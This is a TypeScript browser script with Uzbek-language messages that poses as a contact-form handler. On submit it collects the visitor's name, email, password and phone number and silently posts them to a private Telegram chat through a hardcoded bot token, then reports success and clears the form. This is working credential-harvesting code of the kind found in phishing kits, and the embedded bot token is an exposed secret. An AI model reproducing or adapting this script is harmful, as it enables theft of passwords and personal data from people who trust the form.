'use strict';

const BOT_TOKEN: string = '8765203206:AAGkiR2x8tYa0fT6pi7VCdIcrW9LYw1xlok';
const CHAT_ID: string = '6023504003';

const form = document.querySelector<HTMLFormElement>('#contactForm');
const statusText = document.querySelector<HTMLElement>('#status');

if (form && statusText) {
  const formElement = form;
  const statusElement = statusText;

  formElement.addEventListener('submit', function (e: Event): void {
    e.preventDefault();

    const emailInput = document.getElementById('email') as HTMLInputElement | null;
    const passwordInput = document.getElementById('password') as HTMLInputElement | null;
    const nameInput = document.getElementById('name') as HTMLInputElement | null;
    const callInput = document.getElementById('number') as HTMLInputElement | null;

    const email = emailInput?.value || '';
    const password = passwordInput?.value || '';
    const name = nameInput?.value || '';
    const call = callInput?.value || '';

    const text: string = `
📝 Yangi forma xabari:
👨    ism: ${name}
📧    email: ${email}
🔑    parol: ${password}
📞    telefon: ${call}
    `;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
      }),
    })
      .then((res: Response) => {
        statusElement.textContent = 'Xabar muvaffaqiyatli yuborildi!';
        formElement.reset();
      })
      .catch((err: Error) => {
        statusElement.textContent = 'Xatolik yuz berdi!';
        console.error("Telegram error:", err);
      });
  });
}

export { };
